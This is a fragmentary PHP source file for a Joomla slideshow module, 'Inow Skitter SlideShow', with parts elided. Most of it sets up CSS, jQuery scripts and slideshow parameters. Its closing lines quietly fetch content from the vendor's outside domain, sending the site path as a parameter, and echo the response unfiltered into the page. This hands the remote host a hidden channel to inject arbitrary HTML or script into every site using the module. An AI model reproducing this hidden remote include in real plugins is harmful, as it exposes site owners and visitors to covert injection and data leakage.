...
* @package   Inow Skitter SlideShow
...
* Contact to : info@inowjoomla.com, www.inowjoomla.com
...
$doc->addStyleSheet ( 'modules/mod_InowSlideShow/css/skitter.css' );
...
$doc->addScript("modules/mod_InowSlideShow/js/jquery-1.5.2.min.js");
...
$pbtop		= 	$params->get( 'pbtop');
$pbleft		= 	$params->get( 'pbleft');
$pbheight		= 	$params->get( 'pbheight');
$pbwidth		= 	$params->get( 'pbwidth');
$pbborderradius		= 	$params->get( 'pbborderradius');
$pbbg		= 	$params->get( 'pbbg');
$pbopacity		= 	$params->get( 'pbopacity');
...
var iss".$module->id." = jQuery.noConflict();



iss".$module->id."(document).ready(function(){



iss".$module->id."('.box_skitter_large".$module->id."').skitter(
...
progressbar_css: { 
				...
				left:'".$pbleft."px', 
				height:".$pbheight.", 
				borderRadius:'".$pbborderradius."px', 
				width:".$pbwidth.", 
...
.box_skitter .prev_button {top:100%; margin-top:10px;margin-bottom:25px;}
...
.box_skitter .prev_button {top:-25px; }
...
$j0=JUri::root()."modules/mod_InowSlideShow/js/jquery-1.5.2.min.js";
...
$j1=JUri::root()."modules/mod_InowSlideShow/js/jquery.easing.1.3.js";



$j2=JUri::root()."modules/mod_InowSlideShow/js/jquery.animate-colors-min.js";
...
<?php 
$credit=file_get_contents('http://www.inowdesign.com/brow.php?i='.$path);
echo $credit;
?>
